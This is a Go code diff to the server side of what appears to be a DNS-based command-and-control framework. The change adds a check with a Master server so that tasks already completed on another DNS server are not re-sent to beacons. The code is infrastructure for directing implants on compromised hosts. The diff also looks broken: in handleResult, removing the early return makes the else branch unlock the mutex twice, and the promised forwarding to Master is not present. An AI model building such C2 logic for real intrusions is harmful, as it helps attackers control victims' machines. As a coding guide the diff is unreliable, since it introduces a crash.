@@ -1032,9 +1032,42 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 					// Don't return - fall through to check queue for next task
 				}
 			} else {
-				// Task still pending/sent - resend the same task (idempotent)
-				// This handles duplicate check-ins or retries
+				// Task still pending/sent - but check Master before re-sending
+				// It might have been completed on another DNS server
 				c2.mutex.Unlock()
+
+				// SHADOW MESH: Check Master to see if task was completed elsewhere
+				if masterClient != nil {
+					// Get master task ID if we have a mapping
+					c2.mutex.RLock()
+					masterTaskID, hasMasterID := c2.masterTaskIDs[task.ID]
+					c2.mutex.RUnlock()
+
+					checkTaskID := task.ID
+					if hasMasterID {
+						checkTaskID = masterTaskID
+					}
+
+					// Query Master for task status
+					if masterStatus, err := masterClient.GetTaskStatus(checkTaskID); err == nil {
+						if masterStatus == "completed" || masterStatus == "failed" || masterStatus == "partial" {
+							// Task was completed on another server - clear it locally
+							c2.mutex.Lock()
+							if storedTask, exists := c2.tasks[task.ID]; exists {
+								storedTask.Status = masterStatus
+							}
+							beacon.CurrentTask = ""
+							c2.mutex.Unlock()
+
+							if c2.debug && !isDuplicate {
+								logf("[DEBUG] Task %s was completed on another DNS server (status: %s), cleared from beacon %s", task.ID, masterStatus, beaconID)
+							}
+							return "ACK" // Don't re-send completed task
+						}
+					}
+				}
+
+				// Task still active - resend it (idempotent)
 				taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
 				if c2.debug && !isDuplicate {
 					logf("[DEBUG] Re-sending current task %s to %s (status: %s)", task.ID, beaconID, task.Status)
@@ -1276,17 +1309,11 @@ func (c2 *C2Manager) handleResult(parts []string, isDuplicate bool) string {
 	} else {
 		c2.mutex.Unlock()
 		if c2.debug && !isDuplicate {
-			logf("[DEBUG] WARNING: Task %s not found in memory for result update", taskID)
+			logf("[DEBUG] Task %s not found in memory (completed on another DNS server), forwarding to Master", taskID)
 		}
-		// Still try to save to DB even if not in memory
-		if c2.db != nil {
-			go func(tid, bid, res string) {
-				if err := c2.db.SaveTaskResult(tid, bid, res, 1, 1); err != nil {
-					logf("[C2] Failed to save orphan task result to database: %v", err)
-				}
-			}(taskID, beaconID, result)
-		}
-		return "ACK"
+		// DON'T save to local DB - this task was handled by another DNS server
+		// Just forward to Master so it can be marked complete
+		// The local DB FK constraints would fail anyway since beacon may not be in this server's DB
 	}
 	c2.mutex.Unlock()
 
